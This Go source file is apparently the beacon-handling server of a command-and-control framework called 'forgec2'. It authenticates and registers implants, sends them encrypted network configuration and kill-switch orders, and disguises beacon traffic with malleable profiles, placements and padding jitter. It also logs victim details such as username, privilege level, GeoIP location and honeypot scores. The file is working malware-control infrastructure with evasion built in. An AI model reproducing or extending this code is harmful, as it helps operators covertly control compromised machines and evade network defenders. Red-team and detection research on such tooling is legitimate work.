package server

import (
	"context"
	"crypto/hmac"
	"encoding/base64"
	"fmt"
	"log/slog"
	"net/http"
	"runtime/debug"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/malleable"
	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

// ── Registration / handshake / HTTP entry ─────────────────────────────────

// ensureBeaconImplantRow creates a minimal implant row for fresh agents whose
// first contact is a v2 registration frame (register frames carry no host info,
// so the normal processAgentRegistration path is not available).
func (s *Server) ensureBeaconImplantRow(agentID string) {
	var existing db.Implant
	res := s.db.Unscoped().Where("id = ?", agentID).First(&existing)
	if res.Error == nil {
		// Row exists (possibly soft-deleted): restore the tombstone if needed so
		// the subsequent registration update can bind to it.
		if existing.DeletedAt.Valid {
			s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", agentID).Update("deleted_at", nil)
		}
		return
	}
	if res.Error != gorm.ErrRecordNotFound {
		return
	}
	// Fresh rows fall into the bootstrap "default" tenant so multi-tenant
	// isolation (tenantScope) never hides a newly-registered agent from the
	// owning operator.
	row := db.Implant{ID: agentID, TenantID: s.defaultTenantID(), LastSeen: time.Now(), Status: "online"}
	if err := s.db.Create(&row).Error; err != nil {
		// Concurrent create for the same UUID: someone else won the race.
		slog.Debug("ensureBeaconImplantRow create skipped", "agent_id", agentID, "error", err)
	}
}

// processAuthFrame handles v2 registration and handshake frames. Both are
// authenticated with the per-agent registration key. Returns the JSON response
// envelope and ok=false on any authentication/state failure.
func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]byte, bool) {
	// Enforce the v3 per-implant secret (deprecate the legacy v2 master-key
	// path). v3 implants carry a per-implant secret id (SecretID) and MUST be
	// authenticated against the secret store, not the fleet master key. This
	// applies to BOTH registration and handshake frames: a v3 agent that has
	// already registered locally still presents its SecretID on every
	// handshake, so a server-side row deletion (the per-implant secret outlives
	// the row) can be recovered without re-enrollment. Implants that present no
	// SecretID (the old master-key derivation path) are rejected outright.
	if env.SecretID == "" {
		slog.Warn("Beacon rejected: v2 master-key path deprecated; implant must carry a per-implant secret id", "agent_id", env.UUID, "kind", kind)
		return nil, false
	}
	regKey, ok := s.regSecretForAuth(env.SecretID, env.UUID)
	if !ok {
		slog.Warn("Beacon auth rejected: unknown or misbound secret_id", "agent_id", env.UUID, "kind", kind)
		return nil, false
	}

	// Authenticate the frame MAC against the resolved key.
	if kind == frameRegister {
		expected := crypto.ComputeRegHMAC(regKey, env.UUID, env.IdentityPub, env.Ts, env.Seq)
		got, err := base64.StdEncoding.DecodeString(env.RegHMAC)
		if err != nil || !hmac.Equal(expected, got) {
			slog.Warn("Beacon registration rejected: bad reg_hmac", "agent_id", env.UUID)
			return nil, false
		}
		pub, err := base64.StdEncoding.DecodeString(env.IdentityPub)
		if err != nil || len(pub) != 32 {
			slog.Warn("Beacon registration rejected: invalid identity key", "agent_id", env.UUID)
			return nil, false
		}
	} else { // frameHandshake
		// The handshake must bind the presented ecdh_pub, timestamp AND the
		// frame sequence number to the registration key. Binding seq prevents
		// an attacker who captured a plaintext authentication frame from
		// replaying it with an inflated sequence number to burn the server-side
		// replay window and permanently lock out the real implant.
		expected := computeAuthMAC(regKey, env.UUID, env.ECDHPub, strconv.FormatInt(env.Ts, 10), strconv.FormatUint(env.Seq, 10))
		got, err := base64.StdEncoding.DecodeString(env.Mac)
		if err != nil {
			slog.Warn("Beacon handshake rejected: bad mac encoding", "agent_id", env.UUID)
			return nil, false
		}
		expectedRaw, decErr := base64.StdEncoding.DecodeString(expected)
		if decErr != nil || !hmac.Equal(expectedRaw, got) {
			slog.Warn("Beacon handshake rejected: bad mac", "agent_id", env.UUID)
			return nil, false
		}
	}

	// Make sure an implant row exists. ensureBeaconImplantRow restores a
	// soft-deleted row (preserving its secret_id/registered state) and creates
	// a fresh unregistered row when the row is hard-deleted — both let a v3
	// agent recover via the handshake below.
	s.ensureBeaconImplantRow(env.UUID)
	var imp db.Implant
	s.db.First(&imp, "id = ?", env.UUID)

	// A normal handshake from an already-registered agent leaves the row as-is;
	// first registration (or a v3 recovery where the row is gone/unregistered)
	// (re)binds the identity and re-registers.
	needRegister := kind == frameRegister || !imp.Registered

	if needRegister && kind == frameHandshake {
		if s.sessionManager == nil {
			slog.Warn("Beacon auth rejected: session manager unavailable", "agent_id", env.UUID)
			return nil, false
		}
		// v3 recovery path: the handshake MAC proves the per-implant secret, but
		// a handshake frame carries no identity key, so the server cannot bind
		// the identity. Signal the agent to re-enroll with a fresh registration
		// frame (it holds the identity key locally). The response is still MAC'd
		// so the agent trusts it.
		serverPub := base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
		resp := beaconResponse{
			ProtocolVersion: protocol.CurrentProtocolVersion,
			Seq:             env.Seq,
			Reregister:      true,
			ECDHPub:         serverPub,
			Mac:             computeAuthMAC(regKey, env.UUID, strconv.FormatUint(env.Seq, 10), serverPub),
		}
		// Honor a fleet kill-switch even on the re-register handshake.
		s.enforceKillSwitch(imp, &resp)
		respBytes, ok := marshalJSONSafe(resp)
		if !ok {
			return nil, false
		}
		return respBytes, true
	}

	if needRegister {
		pub, err := base64.StdEncoding.DecodeString(env.IdentityPub)
		if err != nil || len(pub) != 32 {
			slog.Warn("Beacon registration rejected: invalid identity key", "agent_id", env.UUID)
			return nil, false
		}
		// Only write the row once the frame is authenticated; an unauthenticated
		// UUID must never be able to write rows to the DB.
		updates := map[string]interface{}{
			"identity_pub": env.IdentityPub,
			"registered":   true,
			"last_seq":     env.Seq,
			"secret_id":    env.SecretID,
		}
		// Bind identity: only the first registration (registered=false) wins for
		// a given (uuid, seq) — a replayed or concurrent register is rejected.
		res := s.db.Model(&db.Implant{}).
			Where("id = ? AND registered = ? AND last_seq < ?", env.UUID, false, env.Seq).
			Updates(updates)
		if res.Error != nil || res.RowsAffected != 1 {
			slog.Warn("Beacon registration rejected: already registered or replay", "agent_id", env.UUID)
			return nil, false
		}
		s.bindRegSecret(env.SecretID, env.UUID)
		if s.sessionManager != nil {
			if err := s.sessionManager.EstablishSession(env.UUID, pub); err != nil {
				slog.Warn("Beacon registration: session establish failed", "agent_id", env.UUID, "err", err)
				return nil, false
			}
		}
		slog.Info("Beacon registered (v3 per-implant secret)", "agent_id", env.UUID, "recovery", kind != frameRegister)
	} else { // frameHandshake for an already-registered agent
		accepted := s.acceptSeq(env.UUID, env.Seq)
		if !accepted {
			slog.Warn("Beacon handshake rejected: replay or missing row", "agent_id", env.UUID, "seq", env.Seq)
			return nil, false
		}
		pub, err := base64.StdEncoding.DecodeString(env.ECDHPub)
		if err != nil || len(pub) != 32 {
			slog.Warn("Beacon handshake rejected: invalid key", "agent_id", env.UUID)
			return nil, false
		}
		if s.sessionManager == nil {
			slog.Warn("Beacon handshake rejected: session manager unavailable", "agent_id", env.UUID)
			return nil, false
		}
		if err := s.sessionManager.EstablishSession(env.UUID, pub); err != nil {
			slog.Warn("Beacon handshake failed", "agent_id", env.UUID, "err", err)
			return nil, false
		}
	}

	if s.sessionManager == nil {
		slog.Warn("Beacon auth rejected: session manager unavailable", "agent_id", env.UUID)
		return nil, false
	}
	serverPub := base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
	resp := beaconResponse{
		ProtocolVersion: protocol.CurrentProtocolVersion,
		Seq:             env.Seq,
		RegOK:           needRegister,
		ECDHPub:         serverPub,
		Mac:             computeAuthMAC(regKey, env.UUID, strconv.FormatUint(env.Seq, 10), serverPub),
	}
	// Deliver the live network config (encrypted under the per-implant secret)
	// on registration so the implant can override its compile-time defaults.
	if nc, err := s.buildNetworkConfig(imp, regKey); err == nil {
		resp.NetworkConfig = nc
	}
	// Honor a fleet kill-switch on registration/handshake responses too, so a
	// newly-checking-in or recovering agent still obeys a self-destruct order.
	s.enforceKillSwitch(imp, &resp)
	respBytes, ok := marshalJSONSafe(resp)
	if !ok {
		return nil, false
	}
	return respBytes, true
}

// buildNetworkConfig assembles the agent's operational network configuration
// from the bound listener, the server-wide malleable profile, and the
// server-tracked per-agent sleep values, then encrypts it under the per-implant
// registration secret (AES-256-GCM, key = HKDF(secret, network-config info)).
// v2 (master-key) implants never reach here with a usable secret and get "".
func (s *Server) buildNetworkConfig(imp db.Implant, regKey []byte) (string, error) {
	if len(regKey) != 32 {
		return "", fmt.Errorf("invalid reg key")
	}
	nc := &protocol.NetworkConfig{}
	if imp.ListenerID != 0 {
		if rl, err := s.resolveListener(imp.ListenerID); err == nil {
			nc.C2URL = rl.C2URL
			nc.Protocol = rl.Protocol
			nc.BeaconTransport = rl.BeaconTransport
			nc.DNSDomain = rl.DNSDomain
			nc.DNSServer = rl.DNSServer
		}
	}
	if s != nil {
		s.configMu.RLock()
		nc.MalleablePrepend = s.cfg.Malleable.Prepend
		nc.MalleableAppend = s.cfg.Malleable.Append
		nc.RequestPrepend = s.cfg.Malleable.RequestPrepend
		nc.RequestAppend = s.cfg.Malleable.RequestAppend
		nc.RequestHeaders = s.cfg.Malleable.RequestHeaders
		nc.MalleablePlacement = s.cfg.Malleable.Placements
		// Deliver the active profile's output transforms so the live agent can
		// decode the transformed beacon response (otherwise the preset C2
		// pipeline is dead for the live agent).
		if s.cfg.Malleable.ProfileName != "" {
			if profile, ok := malleable.PredefinedProfiles()[s.cfg.Malleable.ProfileName]; ok {
				nc.MalleableRespDecode = profile.HttpPostOutputString()
			} else if out, _, _, ok := s.applyV2FileProfile(s.cfg.Malleable.ProfileName, []byte{}); ok {
				_ = out
				// Reload the v2 chain as wire form for the agent.
				if wire := s.v2RespDecodeWire(s.cfg.Malleable.ProfileName); wire != "" {
					nc.MalleableRespDecode = wire
				}
			}
		}
		s.configMu.RUnlock()
	}
	// Only override sleep values when the server holds authoritative ones
	// (otherwise leave 0 so the agent keeps its compile-time interval/jitter).
	if imp.CurrentInterval > 0 {
		nc.Interval = imp.CurrentInterval
	}
	if imp.CurrentJitter > 0 {
		nc.Jitter = imp.CurrentJitter
	}
	return protocol.EncryptNetworkConfig(regKey, nc)
}

// buildBeaconResponse wraps a processed beacon response in the transport
// envelope, mirroring the HTTP handler. Shared by HTTP, TCP and WebSocket
// beacon paths so every transport returns identical envelope semantics
// (AES-256-GCM encrypted with AAD binding agent ID and sequence number).
func (s *Server) buildBeaconResponse(agentID string, seq uint64, resp beaconResponse) ([]byte, bool) {
	if s.sessionManager == nil {
		slog.Error("ECDH response requested but session manager not initialized", "agent_id", agentID)
		return nil, false
	}
	resp.ProtocolVersion = protocol.CurrentProtocolVersion
	resp.Seq = seq
	respBytes, ok := marshalJSONSafe(resp)
	if !ok {
		return nil, false
	}
	cipherB64, err := s.sessionManager.EncryptB64WithAAD(agentID, respBytes, []byte(agentID+"\x00"+strconv.FormatUint(seq, 10)))
	if err != nil {
		slog.Error("ECDH response encryption failed", "agent_id", agentID, "err", err)
		return nil, false
	}
	return marshalJSONSafe(beaconResponse{CipherB64: cipherB64})
}

func (s *Server) handleBeacon(c *gin.Context) {
	beaconStart := time.Now()
	defer func() {
		if s.metrics != nil {
			transport := "http"
			s.metrics.BeaconDuration.WithLabelValues(transport).Observe(time.Since(beaconStart).Seconds())
		}
	}()

	// Step 1: parse the top-level JSON envelope (v2 protocol)
	raw, err := c.GetRawData()
	if err != nil {
		respondError(c, http.StatusBadRequest, "failed to read body")
		return
	}

	// v2 placements: a cover copy of the envelope may ride at a query /
	// cookie / header location. Prefer it when it decodes to a plausible
	// frame; otherwise fall back to the body (canonical, always sent).
	if placed := s.extractPlacedBody(c); placed != nil {
		raw = placed
	}
	// Strip request-side malleable wrapping the agent applied to the OUTGOING
	// beacon body before decoding the envelope.
	raw = s.stripMalleableRequest(raw)
	// Strip the agent's ContentLengthJitter length-prefixed padding (no-op on
	// unpadded/envelope bodies) so the JSON parser always sees clean envelope
	// bytes regardless of per-beacon body length variance.
	raw = s.stripBodyPadding(raw)

	env, req, kind := s.decodeBeaconEnvelope(raw)
	if kind == frameRejected {
		// A replay-rejected encrypted frame means the agent's sequence fell
		// behind the server's. Reply with a MAC-signed resync carrying the
		// server's current last_seq so the agent can fast-forward instead of
		// being permanently locked out. Only attempted for genuine encrypted
		// frames from a known agent (no row => buildResyncResponse returns false).
		if env.CipherB64 != "" && isValidAgentID(env.UUID) {
			if body, ok := s.buildResyncResponse(env.UUID, env.Seq); ok {
				c.Data(http.StatusOK, "application/json", body)
				return
			}
		}
		respondError(c, http.StatusBadRequest, "invalid beacon payload")
		return
	}

	publicIP := c.ClientIP()

	var respBytes []byte
	if kind == frameEncrypted {
		resp := s.processBeacon(req, publicIP)
		if s.sessionManager.NeedsRekey(req.UUID, BeaconSessionRekeyMessages) {
			resp.Rekey = true
		}
		var ok bool
		respBytes, ok = s.buildBeaconResponse(req.UUID, env.Seq, resp)
		if !ok {
			respondError(c, http.StatusInternalServerError, "response build failed")
			return
		}
	} else {
		var ok bool
		respBytes, ok = s.processAuthFrame(env, kind)
		if !ok {
			respondError(c, http.StatusBadRequest, "authentication failed")
			return
		}
	}

	// Async GeoIP lookup (don't block beacon response) — only when enabled in config.
	// Uses a buffered channel as a bounded queue: when full, oldest entries are dropped
	// to avoid unbounded goroutine growth under heavy beacon load.
	s.configMu.RLock()
	geoIPEnabled := s.cfg.Server.GeoIPEnabled
	s.configMu.RUnlock()
	if geoIPEnabled && publicIP != "" && publicIP != "127.0.0.1" && publicIP != "::1" {
		select {
		case s.geoIPSem <- struct{}{}:
			s.wg.Add(1)
			go func() {
				defer func() {
					<-s.geoIPSem
					s.wg.Done()
					if r := recover(); r != nil {
						slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
					}
				}()
				ctx, cancel := context.WithTimeout(s.ctx, GeoIPLookupTimeout)
				defer cancel()
				country, city, lat, lon := s.lookupGeoIP(ctx, publicIP)
				if country != "" {
					result := s.db.Model(&db.Implant{}).
						Where("id = ? AND (country != ? OR city != ?)", req.UUID, country, city).
						Updates(map[string]interface{}{
							"country": country, "city": city,
							"latitude": lat, "longitude": lon,
						})
					if result.Error != nil {
						slog.Error("Failed to update GeoIP data", "agent_id", req.UUID, "err", result.Error)
					}
				}
			}()
		default:
			slog.Warn("GeoIP lookup queue full, dropping lookup", "agent_id", req.UUID, "ip", publicIP)
		}
	}

	// Render through the malleable profile when enabled: prepend/append bytes,
	// custom status + headers + Content-Type. The raw JSON reply is unchanged
	// for every other transport (TCP/WS/DNS binary frames are not wrapped).
	s.applyMalleableProfile(c, respBytes)
}

func decodeBeaconIdentity(info map[string]string) (hostname, username, ip string) {
	if info == nil {
		return "", "", ""
	}
	hostname = info["hostname"]
	username = info["username"]
	ip = info["ip"]
	if info["encoding"] == "base64" {
		if decoded, err := base64.StdEncoding.DecodeString(hostname); err == nil {
			hostname = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(username); err == nil {
			username = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(ip); err == nil {
			ip = string(decoded)
		}
	}
	return hostname, username, ip
}

// applyDecodedBeaconIdentity rewrites the info map in-place: base64-encoded
// values are decoded and the "encoding" key is removed.
func applyDecodedBeaconIdentity(info map[string]string) {
	if info == nil {
		return
	}
	if info["encoding"] == "base64" {
		if decoded, err := base64.StdEncoding.DecodeString(info["hostname"]); err == nil {
			info["hostname"] = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(info["username"]); err == nil {
			info["username"] = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(info["ip"]); err == nil {
			info["ip"] = string(decoded)
		}
		delete(info, "encoding")
	}
}

var allowedInfoKeys = map[string]bool{
	"hostname": true, "ip": true, "public_ip": true, "os": true, "arch": true,
	"username": true, "integrity": true, "elevated": true, "domain": true,
	"country": true, "city": true, "latitude": true, "longitude": true,
	"version": true, "pid": true, "process_name": true, "parent_id": true,
	"peer_count": true, "tags": true, "note": true, "encoding": true,
	"listener_id": true, "interval": true, "jitter": true, "active_window": true,
	"env_threat_score": true, "env_honeypot": true, "env_class": true,
}

const maxInfoValueLen = 512

func sanitizeInfo(info map[string]string) map[string]string {
	if info == nil {
		return nil
	}
	sanitized := make(map[string]string, len(info))
	for k, v := range info {
		if !allowedInfoKeys[k] {
			continue
		}
		v = strings.ReplaceAll(v, "\x00", "")
		v = strings.TrimSpace(v)
		if len([]rune(v)) > maxInfoValueLen {
			v = string([]rune(v)[:maxInfoValueLen])
		}
		sanitized[k] = v
	}
	return sanitized
}
